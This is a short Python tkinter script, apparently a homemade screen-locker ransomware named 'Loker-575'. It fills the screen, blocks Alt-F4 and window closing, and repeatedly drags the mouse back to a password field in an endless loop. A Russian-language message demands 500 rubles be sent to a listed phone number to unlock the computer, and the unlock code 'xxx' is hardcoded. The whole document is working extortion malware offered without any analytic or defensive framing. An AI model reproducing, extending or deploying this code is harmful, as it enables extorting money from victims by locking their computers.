from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep


def callback(event):
    global k, entry
    if entry.get() == "xxx": k = True


def on_closing():
    click(675, 420)
    moveTo(675, 420)
    root.attributes("-fullscreen", True)  # обновление окна, чтобы нельзя было закрыть его
    root.protocol("WM_DELETE_WINDOW", on_closing)  # Не работает сочетание клавишь (альт-ф4) для закрытие программы
    root.update()
    root.bind('<Control-KeyPress-c>', callback)  # если нажато сочетание клавишь (ctrl-с) -> проверить пароль


# ----------------------------------------------------------------------------------------
root = Tk()  # создание окна
root.title("Loker-575")  # заголовочное название
root.attributes("-fullscreen", True)  # окно во весь экран
entry = Entry(root, font=1)  # Поле ввода
entry.place(width=150, height=50, x=600, y=400)  # кординаты и размеры поля
label_1 = Label(root, text="Loker-571 Чтобы разблокировать компьютер переведите 500 руб на номер +7-977-179-17-43 ", font=1)  # надпись 1
label_1.grid(row=0, column=0)  # кординаты надписи 1
label_2 = Label(root, text="Введите пароль и нажмите Ctrl+C", font=20)  # надпись 2
label_2.place(x=470, y=300)  # кординаты надписи 2

root.update();  # |
sleep(0.3);  # <|обновление экрана программы
click(675, 420)  # |
# ----------------------------------------------------------------------------------------
k = False  # бесконечный цикл
while k != True: on_closing()
